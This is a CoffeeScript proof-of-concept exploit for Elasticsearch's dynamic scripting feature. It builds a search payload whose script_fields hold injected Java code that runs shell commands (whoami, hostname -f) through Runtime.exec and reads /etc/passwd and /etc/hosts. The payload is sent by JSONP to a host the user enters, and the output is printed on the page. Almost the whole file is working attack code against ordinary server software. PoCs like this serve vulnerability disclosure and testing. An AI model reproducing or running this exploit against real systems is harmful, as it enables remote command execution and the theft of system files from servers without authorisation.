execute_code = (cmd) ->
  """
  import java.io.BufferedReader;
  import java.io.InputStreamReader;
  p = Runtime.getRuntime().exec("#{cmd}");
  p.waitFor();
  BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
  reader.readLine();
  """

read_file = (filename) ->
  """
  import java.io.File;
  import java.util.Scanner;
  new Scanner(new File("#{filename}")).useDelimiter("\\\\Z").next();
  """

# This PoC assumes that there is at least one document stored in Elasticsearch, there are ways around that though
$ ->
  $('#check').on 'submit', (e) ->
    e.preventDefault()

    payload = {
      "size": 1,
      "query": {
        "filtered": {
          "query": {
            "match_all": {
            }
          }
        }
      },
      "script_fields": {}
    }

    for filename in ["/etc/hosts", "/etc/passwd"]
      payload["script_fields"][filename] = {"script": read_file(filename)}

    for command in ["whoami", "hostname -f"]
      payload["script_fields"][command] = {"script": execute_code(command)}

    host = $('#host').val()
    responseContent = $('#response')

    responseContent.html('')
    responseContent.append $('<h2>').text("Connecting...")
    responseContent.append $('<h4>').text("Check the network console for error status.")

    $.ajax
      url: "http://#{host}:9200/_search?source=#{encodeURIComponent(JSON.stringify(payload))}&callback=?"
      dataType: 'jsonp'
      success: (data) ->
        console.log(data)
        responseContent.html('')
        responseContent.append $('<h2>').text(host)
        responseContent.append $('<hr>')

        for hit in data["hits"]["hits"]
          for filename, contents of hit["fields"]
            responseContent.append $('<h2>').text(filename)
            responseContent.append $('<pre>').text(contents)
            responseContent.append $('<hr>')
